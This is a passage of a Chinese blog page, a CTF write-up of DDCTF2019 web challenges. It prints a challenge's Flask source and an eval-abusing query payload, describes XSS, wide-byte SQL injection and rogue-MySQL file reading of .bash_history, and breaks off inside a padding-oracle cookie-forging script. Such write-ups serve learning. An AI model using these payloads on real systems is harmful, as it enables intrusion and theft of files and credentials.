@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>DDCTF2019-Web题解 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期五, 四月 19日 2019, 7:11 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      13 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近举办的比赛 DDCTF2019 ，菜鸡 Web 手第二次打这个比赛，题目相比去年整体质量有所下降，有质量的题目只有三题左右，不过也是个能学到东西的好比赛。</p>
+<p>比赛最后两天没有肝 Java 题，被hint弄昏了，辣鸡选手分不清命令执行和代码执行，当然也有对 ysoserial 不熟悉等各种原因在内，所以到最后还是没有能够 AK Web 题目，算是一个遗憾吧，希望明年能变得更强。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>脑洞题，使用文件读取漏洞读取源码，然后根据注释的提示，找到该作者该日期的文章，看到文件名 practice.txt.swp ，访问即可看到下一步，只是简单的变量覆盖就不说了。</p>
+<h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>坑，带上 HTTP 头 didictf_username: admin 访问即可看到源码，利用格式化字符串读取 key ，然后就是简单的反序列化读取文件就不说了。</p>
+<h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p>考点在于绕过 gd 库对图片的渲染，让 gd 库渲染生成的新图片能留下 phpinfo 字符串，参考：<a href="https://xz.aliyun.com/t/416">https://xz.aliyun.com/t/416</a> 。用文章给出的脚本打一遍下来就可以了，注意不是每张图片都可以成功，如果这张图片不行就换一张，或者可以直接搜索其他人使用的素材。</p>
+<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>Python 代码审计，比较有意思的题目，贴下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># written in python 2.7 </span></span><br><span class="line">__author__ = <span class="string">&#x27;garzon&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span> <span class="comment"># censored </span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5af31f66147e857&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FLAG</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;FLAG_is_here_but_i_wont_show_you&#x27;</span>  <span class="comment"># censored </span></span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_event</span>(<span class="params">event</span>): </span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event) </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>: session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:] </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]): </span><br><span class="line">        request.event_queue += event </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        request.event_queue.append(event) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>): </span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):] </span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] </span><br><span class="line">    <span class="keyword">return</span> haystack </span><br><span class="line">     </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RollBackException</span>: <span class="keyword">pass</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_event_loop</span>(): </span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>) </span><br><span class="line">    resp = <span class="literal">None</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>: </span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; </span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:] </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)): <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span> </span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>) </span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>) </span><br><span class="line">            <span class="keyword">try</span>: </span><br><span class="line">                event_handler = <span class="built_in">eval</span>(action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>)) </span><br><span class="line">                ret_val = event_handler(args) </span><br><span class="line">            <span class="keyword">except</span> RollBackException: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span> </span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>] </span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>] </span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line">            <span class="keyword">except</span> Exception, e: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging </span></span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val </span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val </span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>: resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>) </span><br><span class="line">    session.modified = <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">return</span> resp </span><br><span class="line">     </span><br><span class="line"><span class="meta">@app.route(<span class="params">url_prefix+<span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">entry_point</span>(): </span><br><span class="line">    querystring = urllib.unquote(request.query_string) </span><br><span class="line">    request.event_queue = [] </span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span>: </span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session: </span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span> </span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span> </span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = [] </span><br><span class="line">    request.prev_session = <span class="built_in">dict</span>(session) </span><br><span class="line">    trigger_event(querystring) </span><br><span class="line">    <span class="keyword">return</span> execute_event_loop() </span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below -------------------------------------- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_handler</span>(<span class="params">args</span>): </span><br><span class="line">    page = args[<span class="number">0</span>] </span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>]) </span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>: </span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>: </span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>: </span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>] </span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span> </span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">    <span class="keyword">return</span> html </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>(<span class="params">args</span>): </span><br><span class="line">    bool_show_source = <span class="built_in">str</span>(args[<span class="number">0</span>]) </span><br><span class="line">    bool_download_source = <span class="built_in">str</span>(args[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>: </span><br><span class="line">     </span><br><span class="line">        source = <span class="built_in">open</span>(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>: </span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span> </span><br><span class="line">             </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source: </span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>: </span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>) </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                html += line </span><br><span class="line">        source.close() </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>: </span><br><span class="line">            headers = &#123;&#125; </span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span> </span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span> </span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers) </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> html </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>) </span><br><span class="line">         </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_handler</span>(<span class="params">args</span>): </span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>]) </span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items  </span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(num_items), <span class="string">&#x27;action:view;index&#x27;</span>]) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consume_point_function</span>(<span class="params">args</span>): </span><br><span class="line">    point_to_consume = <span class="built_in">int</span>(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException() </span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_flag_function</span>(<span class="params">args</span>): </span><br><span class="line">    flag = args[<span class="number">0</span>] </span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span> </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag_handler</span>(<span class="params">args</span>): </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>: </span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries </span></span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>getflag 的方法很明确，就是弄到五颗以上钻石，然后调用 get_flag_handler ，最后再解码 cookie 就能拿到 flag 了。</p>
+<p>仔细看一下就可以发现，题目对输入的字符串做了过滤，只允许数字字母和 _:;# 等少数几种特殊字符，无法任意执行命令，可以一次购买多个钻石，但是钻石的数量不能为负数，且每次购买钻石之后都会将 consume_point_function 塞进队列里来 check 余额，如果余额不足就会回滚。</p>
+<p>解题思路：</p>
+<ul>
+<li>在 eval 函数中通过 # 注释来调用任意函数，该函数参数只能为 list 。</li>
+<li>因为他的函数调用都是通过队列来顺序调用，并且购买钻石和检查余额不在同一个函数中，所以我们可以通过调用 trigger_event 来打乱他的队列，在购买钻石、检查余额之间插入一个 get_flag_handler 。</li>
+</ul>
+<p>在 eval 中调用 trigger_event ，将 buy_handler 和 get_flag_handler 塞进队列中，使用 buy_handler 购买5个以上的钻石，然后直接调用 get_flag_handler 把 flag 存入 cookie ，这样就算之后服务端检查余额回滚了也不影响我们 getflag ，get 提交 payload ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
+
+<h2 id="欢迎报名DDCTF"><a href="#欢迎报名DDCTF" class="headerlink" title="欢迎报名DDCTF"></a>欢迎报名DDCTF</h2><p>一道 XSS + SQL 注入的题目，很简单但是也很坑。</p>
+<p>题目本来有个 swp 源码泄露，后来出题人给删除了。</p>
+<p>报名页面的 content 可以进行 XSS ，利用 script 远程加载或者 eval(atob(“payload”)) ，都可以。</p>
+<p>利用 XSS 打到 admin.php 的页面，看到一个 query_aIeMu0FUoVrW0NWPHbN6z4xh.php ，提示这里可以输入 id 进行查询，这里是简单的宽字节回显注入，注入出 flag 即可。</p>
+<p><strong>坑点：</strong></p>
+<ul>
+<li>管理员不定时点击。</li>
+<li>宽字节注入点难以发现，粗略测试过根本没有察觉，思路直接跑偏去了其他地方（比如攻击管理员所在的服务器、在 login.php 进行注入）。</li>
+</ul>
+<h3 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h3><p>坑，整数溢出 + 脚本题目。</p>
+<p>服务端在下单时接收单价和付款进行计算时，使用的数据类型不是同一个，所以我们可以通过溢出来让单价为0，即可买到门票。最后的吃鸡部分，写个脚本不停注册然后用自己的账号把他们踢掉即可。</p>
+<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>比较有意思的题目，考点是 MySQL LOAD DATA INFILE 的利用。</p>
+<p>工具： <a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a> 。</p>
+<p>不停读文件就完事了，在 root 的 .bash_history 文件里发现源码文件，在源码文件中发现 flag 的路径，直接读取 &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;security&#x2F;flag.ibd 即可，或者也可以读取 root 目录下的 .mysql_history （非预期？）。</p>
+<h2 id="再来1杯Java"><a href="#再来1杯Java" class="headerlink" title="再来1杯Java"></a>再来1杯Java</h2><p>源码包：<a href="/file/DDCTF2019/Java.zip">附件</a></p>
+<p>本地搭建环境也很简单，题目是个 Spring-Boot 的项目，把 class 反编译一下，然后再配置运行 Application.java 即可。</p>
+<p>题目分为三个部分，密码、文件读取和反序列化。</p>
+<h4 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h4><p>根据提示，需要我们成为 admin ，观察 HTTP 请求，可以得知我们需要伪造一个 cookie ，脚本如下（写得有点乱）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info&quot;</span></span><br><span class="line">data = base64.b64decode(<span class="string">&quot;UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF&quot;</span>)</span><br><span class="line"><span class="comment"># iv = data[:16]</span></span><br><span class="line"><span class="comment"># c = data[16:32]</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line">myd = requests.session()</span><br><span class="line">c_final2 = <span class="string">&quot;\xA7\xD3\x87\x8A\x04f\xC7\x0BY\x26K\x5E\xD3\x3FP\x13&quot;</span></span><br><span class="line"><span class="comment"># c_final1 = 